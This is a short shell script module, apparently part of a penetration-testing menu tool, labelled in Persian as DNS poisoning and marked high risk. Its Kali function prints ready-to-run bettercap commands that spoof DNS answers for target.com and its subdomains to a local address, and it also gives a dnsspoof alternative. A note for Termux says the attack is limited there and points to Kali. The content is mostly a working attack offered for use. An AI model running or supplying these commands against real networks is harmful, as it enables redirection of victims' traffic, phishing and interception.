DESC="مسموم‌سازی DNS"
RISK="HIGH"

termux(){ echo "# محدود؛ از کالی استفاده کن"; }

kali(){
cat <<'EOF'
sudo bettercap -iface eth0
set dns.spoof.domains target.com,*.target.com
set dns.spoof.address 192.168.1.100
dns.spoof on
# یا با dnsspoof:
sudo dnsspoof -i eth0 -f hosts.txt
EOF
}
